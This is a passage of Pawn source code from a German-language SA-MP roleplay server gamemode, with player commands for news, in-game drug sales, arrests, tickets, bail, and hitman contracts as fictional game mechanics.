					GetPlayerName(playerid, sendername, sizeof(sendername));
					new length = strlen(cmdtext);
					while ((idx < length) && (cmdtext[idx] <= ' '))
					{
						idx++;
					}
					new offset = idx;
					new result[100];
					while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
					{
						result[idx - offset] = cmdtext[idx];
						idx++;
					}
					result[idx - offset] = EOS;
					if(!strlen(result))
					{
						SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /news [newstext]");
						return 1;
					}
					format(string, sizeof(string), "NR %s: %s", sendername, result);
//			        SendClientMessageToAllEx(COLOR_NEWS, string);
					OOCNews(COLOR_NEWS,string);
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Du bist nicht im News Van oder Chopper !");
				    return 1;
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Reporter !");
			}
		}//not connected
		return 1;
	}

	if(strcmp(cmd, "/show", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD1, "FEHLER: /show [playerid]");
					return 1;
				}
		        giveplayerid = ReturnUser(tmp);
				if (IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
						if (ProxDetectorS(5.0, playerid, giveplayerid))
						{
						    if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Tippe /stats.!"); return 1; }
						    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							format(string, sizeof(string), "* Du hast %s gefragt ob er deine Statistiken sehen möchte!.", giveplayer);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "* %s Möchte dir seine Statistik zeigen, gib (/accept stats) ein, um zu akzeptieren.", sendername);
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
							StatsStatus[giveplayerid] = playerid;
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Du bist zu weit von diesem Spieler entfernt !");
						    return 1;
						}
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Fehler !");
				    return 1;
				}
			}
		return 1;
	}

	if(strcmp(cmd, "/sellpaket", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pLeader] == 4)
			{
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD1, "FEHLER: /sellpaket [playerid]");
					return 1;
				}
		        giveplayerid = ReturnUser(tmp);
				if (IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
						if (ProxDetectorS(5.0, playerid, giveplayerid))
						{
						    if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Du kannst dir nicht selber ein Paket anbieten.!"); return 1; }
						    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							format(string, sizeof(string), "* Du hast %s ein Erstehilfe Paket angeboten!.", giveplayer);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "* Sanitäter %s bietet dir ein Erstehilfe Paket an, gib (/accept paket) ein, um zu akzeptieren.", sendername);
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
							PaketStatus[giveplayerid] = playerid;
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Du bist zu weit von diesem Spieler entfernt !");
						    return 1;
						}
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Fehler !");
				    return 1;
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Sanitäter !");
			}
		}//not connected
		return 1;
	}


	if(strcmp(cmd, "/live", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9)
			{
			    if(TalkingLive[playerid] != 255)
			    {
			        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Live Unterhaltung beendet.");
			        SendClientMessage(TalkingLive[playerid], COLOR_LIGHTBLUE, "* Live Unterhaltung beendet.");
			        UnFreezePlayer(playerid);
			        UnFreezePlayer(TalkingLive[playerid]);
		            TalkingLive[TalkingLive[playerid]] = 255;
			        TalkingLive[playerid] = 255;
			        return 1;
			    }
                if(PlayerInfo[playerid][pRank] < 6)
				{
				    SendClientMessage(playerid, COLOR_GREY, "Du benötigst mindestens Rang 6!");
				    return 1;
				}
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD1, "FEHLER: /live [playerid]");
					return 1;
				}
		        giveplayerid = ReturnUser(tmp);
				if (IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
						if (ProxDetectorS(5.0, playerid, giveplayerid))
						{
						    if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Du kannst nicht mit dir selbst ein Gespräch führen!"); return 1; }
						    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							format(string, sizeof(string), "* Du hast %s zu einer Live Konversation eingeladen.", giveplayer);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "* %s bietet dir eine Live Konversation an, gib (/accept live) ein, um zu akzeptieren.", sendername);
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
							LiveOffer[giveplayerid] = playerid;
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Du bist zu weit von diesem Spieler entfernt !");
						    return 1;
						}
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Fehler !");
				    return 1;
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Du bist kein San News Reporter !");
			}
		}//not connected
		return 1;
	}
	if(strcmp(cmd, "/selldrugs", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
		    if(PlayerInfo[playerid][pJob] != 4)
		    {
				SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Drogen Dealer!");
				return 1;
		    }
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /selldrugs [playerid] [betrag] [preis]");
				return 1;
			}
			new playa;
			new money;
			new needed;
			playa = ReturnUser(tmp);
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp)) { return 1; }
			needed = strval(tmp);
			if(needed < 1 || needed > 99) { SendClientMessage(playerid, COLOR_GREY, "   Das Drogengewicht darf nicht unter 1 oder über 99 Gramm liegen!"); return 1; }
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp)) { return 1; }
			money = strval(tmp);
			if(money < 1 || money > 99999) { SendClientMessage(playerid, COLOR_GREY, "   Der Preis darf nicht unter 1 oder über 99999 liegen!"); return 1; }
			if(needed > PlayerInfo[playerid][pDrugs]) { SendClientMessage(playerid, COLOR_GREY, "   Du hast nicht genug Drogen dabei !"); return 1; }
			if(IsPlayerConnected(playa))
			{
			    if(playa != INVALID_PLAYER_ID)
			    {
					if (ProxDetectorS(8.0, playerid, playa))
					{
					    if(playa == playerid)
					    {
					        SendClientMessage(playerid, COLOR_GREY, "   Du kannst nicht an dich selber verkaufen!");
					        return 1;
					    }
					    GetPlayerName(playa, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
					    format(string, sizeof(string), "* Du hast %s %d Gramm Drogen für $%d angeboten  .", giveplayer, needed, money);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* Drogendealer %s bietet dir %d Gramm Drogen für $%d an, (gib /accept drugs) ein um sie zu kaufen.", sendername, needed, money);
						SendClientMessage(playa, COLOR_LIGHTBLUE, string);
						DrugOffer[playa] = playerid;
						DrugPrice[playa] = money;
						DrugGram[playa] = needed;
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist nicht nah genug !");
					}
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline.");
			}
		}
		return 1;
	}
	if(strcmp(cmdtext, "/usedrugs", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	   	{
			if(PlayerInfo[playerid][pDrugs] >= 1)
			{
			   // PlayerStoned[playerid] += 6;
			    PlayerStoned[playerid] += 10;
			    if(PlayerStoned[playerid] >= 31)
				{
				GameTextForPlayer(playerid, "~w~Du bist~n~~p~ voll Stoned", 4000, 1);
	        	return 1;
				}
			    new Float:health1;
			    GetPlayerHealth(playerid,health1);
			    if (health1 >= 100)
			    {
				GameTextForPlayer(playerid, "~w~Du hast bereits~n~~p~ Full HP", 4000, 1);
	        	return 1;
			    }
			    new Float:health;
			    GetPlayerHealth(playerid, health);
			    if(PlayerInfo[playerid][pDrugPerk] > 0)// Drogenskill
			    {
			        new stone = 1 * PlayerInfo[playerid][pDrugPerk];
           			new hp = 20 * PlayerInfo[playerid][pDrugPerk];
	      			//hp += 30;
					hp = hp + 30;
					SetPlayerHealth(playerid, health + hp);
	      			stone = PlayerStoned[playerid] - stone;
			    }
			    else
			    {
			        SetPlayerHealth(playerid, health + 15);
			        SetPlayerArmour(playerid, 25);
			    }
			    GetPlayerName(playerid, sendername, sizeof(sendername));
			    format(string, sizeof(string), "%s hat Drogen eingenommen", sendername);
				ProxDetector(15.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			    SendClientMessage(playerid, COLOR_GREY, "   1 Gramm Drogen genommen !");
			    PlayerInfo[playerid][pDrugs] -= 1;
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Du hast keine Drogen mehr !");
			}
		}//not connected
		return 1;
	}
	if(strcmp(cmd, "/eject", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	   	{
	        new State;
	        if(IsPlayerInAnyVehicle(playerid))
	        {
         		State=GetPlayerState(playerid);
		        if(State!=PLAYER_STATE_DRIVER)
		        {
		        	SendClientMessage(playerid,COLOR_GREY,"   Du kannst nur als Fahrer Leute aus dem Auto werfen !");
		            return 1;
		        }
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /eject [playerid]");
					return 1;
				}
				new playa;
				playa = ReturnUser(tmp);
				new test;
				test = GetPlayerVehicleID(playerid);
				if(IsPlayerConnected(playa))
				{
				    if(playa != INVALID_PLAYER_ID)
				    {
				        if(playa == playerid) { SendClientMessage(playerid, COLOR_GREY, "Du kannst dich nicht selber rauswerfen!"); return 1; }
				        if(IsPlayerInVehicle(playa,test))
				        {
							new PName[MAX_PLAYER_NAME];
							GetPlayerName(playerid,PName,sizeof(PName));
							GetPlayerName(playa, giveplayer, sizeof(giveplayer));
							format(string, sizeof(string), "* Du hast %s aus dem Auto geschmissen!", giveplayer);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "* Du wurdest von %s aus dem Auto geschmissen!", PName);
							UnFreezePlayer(playa);
							SendClientMessage(playa, COLOR_LIGHTBLUE, string);
							RemovePlayerFromVehicle(playa);
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, " Der Spieler ist nicht in deinem Auto !");
						    return 1;
						}
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, " Falsche ID!");
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Du mußt in einem Farzeug sitzen um den Befehl nutzen zu können ! !");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/gefangene", true) == 0)
	{
	    if(IsACop(playerid)||PlayerInfo[playerid][pAdmin] >= 3)
	    {
	        SendClientMessage(playerid, COLOR_RED, "========[Gefangene]========");
	        for(new i=0; i < MAX_PLAYERS; i++)
	        {
	            if(PlayerInfo[i][pJailed] > 0 && IsPlayerConnected(i))
	            {
	                GetPlayerName(i, giveplayer, sizeof(giveplayer));
	                format(string, sizeof(string), "%s%s [ID: %d | Restliche Sekunden: %d]", string, giveplayer,i,PlayerInfo[i][pJailTime]);
			  		SendClientMessage(playerid, COLOR_YELLOW, string);
				}
			}
			SendClientMessage(playerid, COLOR_RED, "===========================");
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Polizist!");
		}
		return 1;
	}
	if(strcmp(cmd, "/wanted", true) == 0)
	{
        new final[256], wanted313[800];
		format(final, sizeof(final), "ID\tName\tWantedanzahl\tStandort\n");
	    if(IsPlayerConnected(playerid))
	   	{
			if(gTeam[playerid] == 2 || IsACop(playerid) || PlayerInfo[playerid][pMember] == 12 || PlayerInfo[playerid][pLeader] == 12 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3)
			{
				DialogTempIndexWanted[playerid] = 0;
			    for(new i=0; i < MAX_PLAYERS; i++)
				{
					if(IsPlayerConnected(i))
					{
					    if(WantedLevel[i] > 0)
					    {
							DialogTempWanted[playerid][DialogTempIndexWanted[playerid]++] = i;
	 						new LocationZone[MAX_ZONE_NAME];
	  						GetPlayer2DZone(i, LocationZone, MAX_ZONE_NAME);
							GetPlayerName(i, giveplayer, sizeof(giveplayer));
							format(wanted313, sizeof(wanted313), "%d\t%s\t%d\t%s\n",i,giveplayer,WantedLevel[i],LocationZone);
							strcat(final, wanted313);
						}
					}
				}
				ShowPlayerDialog(playerid, DIALOG_WANTED, DIALOG_STYLE_TABLIST_HEADERS, "[/wanted] - Wantedliste", final , "Ok", "");

				if(DialogTempIndexWanted[playerid] == 0)
				{
			    SendClientMessage(playerid, COLOR_GREY, "Niemand auf dem Server hat derzeit Wanteds!");
				return 1;
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "Du bist kein Beamter!");
			}
		}//not connected
		return 1;
	}
/*
	if(strcmp(cmd, "/wanted", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	   	{
			if(gTeam[playerid] == 2 || IsACop(playerid) || PlayerInfo[playerid][pMember] == 12 || PlayerInfo[playerid][pLeader] == 12 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3||PlayerInfo[playerid][pAdmin] >= 3)
			{
				SendClientMessage(playerid, COLOR_RED, "========[Gesuchte Spieler]========");
			    for(new i=0; i < MAX_PLAYERS; i++)
				{
					if(IsPlayerConnected(i))
					{
					    if(WantedLevel[i] > 0)
					    {
							GetPlayerName(i, giveplayer, sizeof(giveplayer));
							format(string, sizeof(string), "%s[ID:%d]: %d", giveplayer,i,WantedLevel[i]);
						    SendClientMessage(playerid, COLOR_YELLOW, string);
						}
					}
				}
				SendClientMessage(playerid, COLOR_RED, "===================================");
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "Du bist kein Beamter !");
			}
		}//not connected
		return 1;
	}
*/


	/*if(strcmp(cmd, "/quitjob", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	   	{
		    if(PlayerInfo[playerid][pJob] > 0)
		    {
		        if(PlayerInfo[playerid][pDonateRank] >= 0)
		        {
		            if(PlayerInfo[playerid][pContractTime] >= 2)
					{
					    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast deinen 1 Stunden Vertrag erfüllt und den Job gekündigt.");
					    PlayerInfo[playerid][pContractTime] = 0;
					}
					else
					{
					    new chours = 2 - PlayerInfo[playerid][pContractTime];
					    format(string, sizeof(string), "* Du musst noch %d Stunden arbeiten um den Vertrag zu erfüllen und den Job kündigen zu können.", chours / 2);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "Du hast keinen Job !");
			}
		}
		return 1;
	}*/


	if(strcmp(cmd, "/bail", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	   	{
			if(PlayerInfo[playerid][pJailed]==1)
			{
			    if(JailPrice[playerid] > 0)
			    {
			        if(GetPlayerMoneySave(playerid) > JailPrice[playerid])
			        {
			            format(string, sizeof(string), "Du hast dich selber für eine Kaution von $%d rausgeholt.", JailPrice[playerid]);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						GivePlayerMoneySave(playerid, -JailPrice[playerid]);
						JailPrice[playerid] = 0;
						PlayerInfo[playerid][pJailTime] = 1;
			        }
			        else
			        {
			            SendClientMessage(playerid, COLOR_GRAD1, "   Du kannst dir die Kaution nicht leisten !");
			        }
			    }
			    else
			    {
			        SendClientMessage(playerid, COLOR_GRAD1, "   Du hast keine Kaution !");
			    }
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "   Du bist nicht im Gefängnis !");
			}
		}//not connected
		return 1;
	}
	if(strcmp(cmd, "/clear", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	   	{
	 		if(gTeam[playerid] == 2 || IsACop(playerid)|| IsAbf(playerid))
			{
					tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
						SendClientMessage(playerid, COLOR_GRAD1, "Benutz: /clear [Spielerid]");
						return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
	                        if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Du kannst deine Akte nicht selber säubern!"); return 1; }
						    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							format(string, sizeof(string), "* Du hast die Akte von %s gereinigt.", giveplayer);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "* %s %s hat deine Akte gereinigt.",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername);
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
							for(new i=0; i<MAX_PLAYERS; i++)
							{
								if(IsACop(i))
								{
									format(string, sizeof(string), "%s hat %s's Akte gereinigt.", sendername, giveplayer);
									SendClientMessage(i, COLOR_LIGHTBLUE, string);
									Clear(string);
								}
							}
							WantedPoints[giveplayerid] = 0;
							WantedLevel[giveplayerid] = 0;
							ClearCrime(giveplayerid);

//							SetPlayerWantedLevel(giveplayerid,0);
							if(gTeam[giveplayerid]==4)
							{
							    gTeam[giveplayerid] = 3;
							    //SetPlayerToTeamColor(giveplayerid);
							}
						}
					else
					{
						SendClientMessage(playerid, COLOR_GREY, "Der Spieler ist nicht online!");
					}
				}
			}
		}//not connected
		return 1;
	}
	if(strcmp(cmd, "/orten", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
		    if(!IsACop(playerid))
		    {
				SendClientMessage(playerid, COLOR_GREY, "Du bist kein Polizist!");
				return 1;
		    }
		    tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /orten [Spieler ID]");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
			if(IsPlayerConnected(giveplayerid))
			{
			    if(giveplayerid != INVALID_PLAYER_ID)
			    {
					new Float:X,Float:Y,Float:Z;
					GetPlayerPos(giveplayerid, X,Y,Z);
					SetPlayerCheckpoint(playerid, X,Y,Z, 6);
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "Falsche ID!");
			}
		}
	    return 1;
	}
	if(strcmp(cmd, "/ticket", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][sMember] == 1 || PlayerInfo[playerid][sMember] == 2 || PlayerInfo[playerid][sMember] == 3 || PlayerInfo[playerid][sMember] == 24 || PlayerInfo[playerid][sMember] == 22)
			{
	    	tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /ticket [playerid] [preis] [Grund]");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
            tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /ticket [playerid] [preis] [Grund]");
				return 1;
			}
			moneys = strval(tmp);
			if(moneys < 1 || moneys > 99999) { SendClientMessage(playerid, COLOR_GREY, "   Nicht weniger als 1 oder mehr als 99999 !"); return 1; }
			if(IsPlayerConnected(giveplayerid))
			{
			    if(giveplayerid != INVALID_PLAYER_ID)
			    {
			        if (ProxDetectorS(8.0, playerid, giveplayerid))
					{
					    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						new length = strlen(cmdtext);
						while ((idx < length) && (cmdtext[idx] <= ' '))
						{
							idx++;
						}
						new offset = idx;
						new result[64];
						while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
						{
							result[idx - offset] = cmdtext[idx];
							idx++;
						}
						result[idx - offset] = EOS;
						if(!strlen(result))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "Benutz: /ticket [playerid] [Preis] [Grund]");
							return 1;
						}
						format(string, sizeof(string), "* Du hast %s ein Ticket in Höhe von $%d ausgestellt, Grund: %s", giveplayer, moneys, (result));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* Officer %s hat dir ein Ticket in Höhe von $%d ausgestellt, Grund: %s", sendername, moneys, (result));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "* Um das Ticket zu bezahlen gib '/accept ticket' ein.");
						TicketOffer[giveplayerid] = playerid;
						TicketMoney[giveplayerid] = moneys;
						return 1;
					}
					else
					{
						SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist nicht nah genug !");
						return 1;
					}
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
			    return 1;
			}
          }
		}
		return 1;
	}
	if(strcmp(cmd, "/arrest", true) == 0)// By CoL Team
	{
	    if(IsACop(playerid))
	    {
			if(IsPlayerInRangeOfPoint(playerid, 20.0, 1564.6588,-1694.1836,5.8906) || IsPlayerInRangeOfPoint(playerid,20.0, -1589.3329,716.3265,-5.2422)|| IsPlayerInRangeOfPoint(playerid,20.0,2281.5049,2431.0366,3.2734))
			{
				new suspect = GetClosestPlayer(playerid);
				if(IsACop(suspect))
				{
					SendClientMessage(playerid, COLOR_GRAD2, " Du kannst keinen Beamten einsperren!");
					return 1;
				}
					if(IsPlayerConnected(suspect))
					{
						if(GetDistanceBetweenPlayers(playerid,suspect) < 10)
						{
						    moneys = WantedLevel[suspect] * 3000;
						    new time = WantedLevel[suspect] * 60;
							GetPlayerName(suspect, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							if(WantedLevel[suspect] < 1)
							{
			    				SendClientMessage(playerid, COLOR_GREY, "Der Spieler ist nicht gesucht!");
						    	return 1;
							}
							GivePlayerMoneySave(playerid, moneys/2);
							FraktionsKasse[0] += moneys/2;
							format(string, sizeof(string), "* Du hast %s eingesperrt für %d$ und %d Minuten!", giveplayer,moneys, time/60);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							GivePlayerMoneySave(suspect, -moneys);
							format(string, sizeof(string), "* Du wurdest von %s für %d Minuten und für %d$ eingesperrt", sendername, time/60, moneys);
							SendClientMessage(suspect, COLOR_LIGHTBLUE, string);
							ResetPlayerWeapons(suspect);

							new kosten = time  * 6600;

							FraktionsKasse[6] -= kosten;
							for(new i = 0; i<MAX_PLAYERS; i++)
							{
							    if(PlayerInfo[i][pLeader] == 7)
							    {
							        format(string,sizeof(string),"(Aktuelle Info): %s wurde für %d Sekunden eingesperrt. %d$ wurden vom Haushalt abgezogen",giveplayer,time,kosten);
							        SCM(i,-1,string);
								}
							}

							if(PlayerInfo[playerid][sMember]==1||PlayerInfo[playerid][sMember]==2||PlayerInfo[playerid][sMember]==3||PlayerInfo[playerid][sMember]==22)
							{
								format(string, sizeof(string), "<< %s %s hat den Verdächtigen %s eingesperrt >>",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, giveplayer);
								OOCNews(COLOR_LIGHTRED, string);
							}
		                    if(WantedLevel[suspect] >= 6)
			                {
						     	PlayerInfo[suspect][pJailed] = 2;
				    	        SendClientMessage(suspect, COLOR_LIGHTBLUE, "Alle Anwälte wurden Infomiert!");
		                     	SetPlayerPos(suspect,219.6281,110.6854,999.0156);// SFPD
				        		SetPlayerInterior(suspect, 10);
				            }
				            else
				            {
						      	PlayerInfo[suspect][pJailed] = 1;
				    	        SendClientMessage(suspect, COLOR_LIGHTBLUE, "Alle Anwälte wurden Infomiert!");
		                     	SetPlayerPos(suspect,264.0360,82.2929,1001.0391);// LSPD
				        		SetPlayerInterior(suspect, 6);
					            }
								PlayerInfo[suspect][pJailTime] = time;
			     				PlayerInfo[suspect][pArrested] += 1;
								WantedPoints[suspect] = 0;
								WantedLevel[suspect] = 0;
	//							SetPlayerWantedLevel(suspect,0);
	                            OnPlayerCommandText(suspect,"/time");
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GRAD1, "Spieler nicht in der Nähe!");
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Spieler ist nicht online!");
					}
				}

			else
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht am Arrest Punkt!");
			}
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Cop!");
		}
		return 1;
	}
	if(strcmp(cmd, "/contract", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	   	{
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Benutze: /contract [playerid] [Betrag]");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Benutze: /contract [playerid] [Betrag]");
				return 1;
			}
			moneys = strval(tmp);
			if(moneys < 5000 || moneys > 100000) { SendClientMessage(playerid, COLOR_GREY, "   Die Vertragssumme muß mindestens $5000-, aber nicht mehr als $100000 betragen!"); return 1; }
			if(PlayerInfo[playerid][pLevel] < 3)
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Du mußt mindestens Level 3 haben um einen Vertrag zu erstellen.");
				return 1;
			}
			else if(PlayerInfo[playerid][sMember] == 8)
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Mitglieder der Hitman Agency können kein /contract!.");
				return 1;
			}
			if (IsPlayerConnected(giveplayerid))
			{
			    if(giveplayerid != INVALID_PLAYER_ID)
			    {
                    if(PlayerInfo[giveplayerid][pLevel] == 1)
                    {
				        SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist Level 1!");
				        return 1;
				    }
				    if(PlayerInfo[giveplayerid][sMember] == 4 ||PlayerInfo[giveplayerid][sMember] == 24)
				    {
				        SendClientMessage(playerid, COLOR_GREY, "   Auf diese Fraktion kann kein Kopfgeld gesetzt werden!");
				        return 1;
				    }
				    if(PlayerInfo[giveplayerid][sMember] == 8)
				    {
				        SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist Mitglied der Hitman Agency!");
				        return 1;
				    }
				    if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Du kannst dich nicht selber unter Vertrag nehmen!"); return 1; }
					GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					playermoney = GetPlayerMoneySave(playerid);
					if (moneys > 0 && playermoney >= moneys)
					{
						GivePlayerMoneySave(playerid, (0 - moneys));
						PlayerInfo[giveplayerid][pHeadValue]+=moneys;
						format(string, sizeof(string), "%s möchte das ein Hitman die Zielperson: %s für $%d tötet.",sendername, giveplayer, moneys);
						SendFamilyMessage(8, COLOR_YELLOW, string);
						format(string, sizeof(string), "* Du hast einem Hitman den Auftrag zur Beseitigung von %s für $%d erteilt.",giveplayer, moneys);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					}
					else
					{
						SendClientMessage(playerid, COLOR_GRAD1, "   Falsche Angaben!");
					}
				}
			}
			else
			{
				format(string, sizeof(string), "   %d ist kein Aktiver Spieler.", giveplayerid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
		}
		return 1;
	}

//================= Function ENDE ==================//    PlayAudioStreamForPlayer(playerid, "http://gta-city-reallife.de/login.mp3");
















    return SendClientMessage(playerid,-1,"Der Befehl wurde nicht gefunden, Verwende {6EF83C}/help!");
//	return 1;
}

//------------------------------------------------------------------------------------------------------
Function ProxDetector(Float:radi, playerid, string[],col1,col2,col3,col4,col5)
{
	if(IsPlayerConnected(playerid))
	{
		new Float:posx, Float:posy, Float:posz;
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		//radi = 2.0; //Trigger Radius
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i))
			{
				if(!BigEar[i])
				{
					GetPlayerPos(i, posx, posy, posz);
					tempposx = (oldposx -posx);
					tempposy = (oldposy -posy);
					tempposz = (oldposz -posz);
